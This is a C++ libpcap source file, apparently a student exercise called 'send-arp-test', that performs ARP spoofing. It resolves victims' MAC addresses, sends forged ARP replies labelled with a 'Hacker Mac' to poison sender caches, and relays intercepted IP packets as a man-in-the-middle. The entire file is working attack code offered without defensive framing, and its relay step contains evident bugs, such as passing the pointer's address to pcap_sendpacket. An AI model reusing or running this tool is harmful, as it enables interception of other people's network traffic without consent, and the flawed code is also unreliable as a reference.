#include <string>
#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include "ethhdr.h"
#include "arphdr.h"
using namespace std;
#define MAC_SIZE 6
#define TMAC_SIZE 20
#pragma pack(push, 1)
pcap_t* handle;

int size=0;	
char my_ip[40];
char my_tmac[TMAC_SIZE];
unsigned char my_mac[MAC_SIZE];
u_int8_t m_ip[4];
unsigned char test_mac[14];
char  *dev;
char temp_mac[TMAC_SIZE];
char sender_mac[TMAC_SIZE];
char target_mac[TMAC_SIZE];

u_int32_t packetsize=0;
u_int8_t eth_header_len = 14;
u_int8_t ip_header_len;//4bit
u_int8_t tcp_header_len;//4bit

void show_mytable();
int find_relay_packet(const u_char* packet);
void send_relay();
bool find_arp_packet(const u_char* packet,char *mac,char* ip,int num);
void transform_mac(unsigned char* mac,char* tmac);
void cmp_ip(char* ip, uint32_t tempip);
void find_my_ip();
void find_my_mac();
void send_forg_arp(char *sip,char *dip);	
void find_mac(char *ip,char *mac, int num);

struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

struct Pair{
	u_int8_t ip[4];
	u_int8_t mac[6];
};

struct Pair *pArr;// 0 - my 1 - target

int main(int argc, char* argv[]) {

	//printf("argc = %d\n", argc);	

	if ( argc < 4 | argc % 2 == 1) {//input error
		usage();
		return -1;
	}

	size = argc / 2 - 1; // number of arp packet
	dev = argv[1];//interface assign
	char errbuf[PCAP_ERRBUF_SIZE];
	//printf("\n size = %d\n", size);
	pArr = (struct Pair*)malloc(sizeof(struct Pair)*size*2);// pair arr

	handle = pcap_open_live(dev,BUFSIZ , 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	///////////////////////////////////////////////// 
	find_my_mac();//my_mac = mac;
	find_my_ip();//my_ip = interface ip;

	transform_mac(my_mac,my_tmac);

		
	for(int i=0; i< size;i++)
	{
		memset(sender_mac,0,11);
		memset(target_mac,0,11);
		
		find_mac(argv[i*2+2],sender_mac,i*2);// find sender mac


		find_mac(argv[i*2+3],target_mac,(i*2)+1);// find target mac

		send_forg_arp(argv[i*2+2],argv[i*2+3]);	
		printf("\n");
	}
//////////////// find relay packet///////////////
	show_mytable();
	fflush(stdout);
	send_relay();
	pcap_close(handle);
}
void show_mytable(){
	printf("\n my ip= ");
	for(int k=0;k<4;k++)
	{
		printf("%u ",m_ip[k]);
	}
	printf("\n my mac= ");
	for(int k=0;k<6;k++)
	{
		printf("%u ",my_mac[k]);
	}
		
	for(int i=0;i<size*2;i++)
	{
		printf("\n table %d ip = ",i);
		for(int k=0;k<4;k++)
		{
			printf("%u ",pArr[i].ip[k]);
		}
		printf("\n table %d mac= ",i);
		for(int k=0;k<6;k++)
		{
			printf("%x ",pArr[i].mac[k]);
		}

	}
}
int find_relay_packet(const u_char* packet){
	u_int16_t type = 0x0008;// ip type little endian
	for(int i=0; i< size; i++)
	{
		//printf("what time%d \n",i);
		//source mac = sender mac & des ip = target ip			
		if(!(memcmp((pArr[i*2].mac),&packet[6],6)))//find sender mac
		{
				printf("\n find sender mac = ");
				for(int k=0; k<6 ; k++)
				{
					printf("%2x ",packet[6+k]);
				}
				printf("\n find sender ip = ");
				for(int k=0; k<4 ; k++)
				{
					printf("%u ",packet[26+k]);
				}
			if((memcmp(m_ip,&packet[30],4)) && !memcmp(&packet[12],&type,2))//target check- not my ip but my mac = spoof target + ip packet
			{
				printf("\n type = ");
				for(int a=0;a<2;a++)
				{
					printf("%.2x ", packet[12+a]);
				}
				printf("\n i= %d", i*2);
				return i*2 + 1;
			}
			else
				return 0;
		/*
			printf("\n find sender mac1 = ");
			for(int k=0;k<6;k++)
			{
				printf("%x ",pArr[i*2].mac[k]);
			}
			printf("\n");
			
			printf("\n find sender mac = ");
			for(int k=0;k<6;k++)
			{
				printf("%x ",packet[k+6]);
			}
			printf("\n");

			return true;
		*/
				
		}
	}

	return 0;	
}

void send_relay(){
	while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
		u_char* temppacket;
        int res = pcap_next_ex(handle, &header, &packet);
		int *table_num;
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        if(int t_size = find_relay_packet(packet))// find relay packet;
        {
			t_size -=1;	
			memcpy((void*)packet,(void*)pArr[t_size+1].mac,6);
			
			printf(" \nmod mac = "); 
			for(int k=0;k < header->len; k++)
			{
				//printf("%x ",packet[k]);
				printf("%x ",packet[k]);
			}
			//printf("find");	
            //break;
       		printf("\n paket len1 = %d", header->len);
       		printf("\n paket len2 = %d", header->caplen);
       		printf("\n paket len3 = %d", sizeof(EthArpPacket));
			
			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet),(int)header->len);
			printf(" \nsend data = "); 
			for(int k=0;k < header->len; k++)
			{
				printf("%x ",packet[k]);
			}
			printf("\n mod packet send");

			if(res !=0){
				fprintf(stderr,"pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		}
	}
}
void cmp_ip(char* ip,uint32_t tempip){
	char iparr[48];
	u_char buf[4];
}
void transform_mac(unsigned char* mac, char* tmac){
	int size=0;
	for(int i=0; i < 6;i++)
	{
		if(i==5){
			sprintf(&tmac[size],"%.2x",mac[i]);
			break;
		}	
		size +=sprintf(&tmac[size],"%.2x:",mac[i]);
	}
}

void find_mac(char* ip,char* mac, int num){
	EthArpPacket packet;
	
	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");//broad cast Mac
	packet.eth_.smac_ = Mac(my_tmac);//my Mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_tmac);//my Mac
	packet.arp_.sip_ = htonl(Ip(my_ip));//my Ip
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");//your Mac
	packet.arp_.tip_ = htonl(Ip(ip));//your Ip
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
	while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        packetsize = header->caplen;
		
		if(find_arp_packet(packet, mac, ip,num))//if find arp break;
		{
			break;
		}
    }

}
void send_forg_arp(char *sip,char *dip){

	EthArpPacket packet;
	
	packet.eth_.dmac_ = Mac(sender_mac);//Sender Mac
	packet.eth_.smac_ = Mac(my_tmac);//Hacker Mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(my_tmac);//Hacker Mac
	packet.arp_.sip_ = htonl(Ip(dip));//Gateway Ip
	packet.arp_.tmac_ = Mac(sender_mac);//Sender Mac
	packet.arp_.tip_ = htonl(Ip(sip));//Sender Ip
	
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	printf("\n send mod arp packet\n");
}

bool find_arp_packet(const u_char* packet,char * mac,char *ip,int num){
	uint8_t arp_sig[2];
	uint8_t arp_op[2];
	
	memcpy(arp_op,&packet[20],2);
	memcpy(arp_sig,&packet[12],2);
	
	uint16_t* p = reinterpret_cast<uint16_t*>(arp_sig);
	uint16_t* op_p = reinterpret_cast<uint16_t*>(arp_op);
	
	uint16_t n = *p;
	uint16_t op_n = *op_p;
	
	n = ntohs(n);
	op_n = ntohs(op_n);
	if( n == 0x0806 && op_n == 0x0002)//find arp and reply packet control
	{	
		uint8_t arr[4];
		char temp[48];
		printf(" \n check = %d", num);
		memcpy(arr,&packet[28],4);
		memcpy(pArr[num].ip,&packet[28],4);
		memcpy(pArr[num].mac,&packet[22],6);
		sprintf(temp,"%d.%d.%d.%d",arr[0],arr[1],arr[2],arr[3]);
		int result = strcmp(temp,ip);
		if(!strcmp(temp,ip))// same - copy mac
		{
			sprintf(mac,"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",packet[22],packet[23],packet[24],packet[25],packet[26],packet[27]);
			return true;
		}

	}
	return false;
}
void ck_ip_header_len(u_char *buf){
}
void ck_tcp_header_len(u_char *buf){
}
bool ck_tcp(u_char *buf){
	return true;
}

bool pcap_print(u_char *buf)
{
	return true;
}
void find_my_ip()
{
	struct ifreq ifr;
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
	} else {
		memcpy(m_ip, &ifr.ifr_hwaddr.sa_data[2],4);//my ip bin
		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,my_ip,sizeof(struct sockaddr));
	}

}
void find_my_mac()
{
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

	setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, dev,sizeof(dev) );
    
	ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));
	char *tempdev;	

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback

  				if(strcmp(it->ifr_name,dev)){
					continue;//same interface mac 
				}
	
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }

    if (success) 
	{
		memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
	}
}
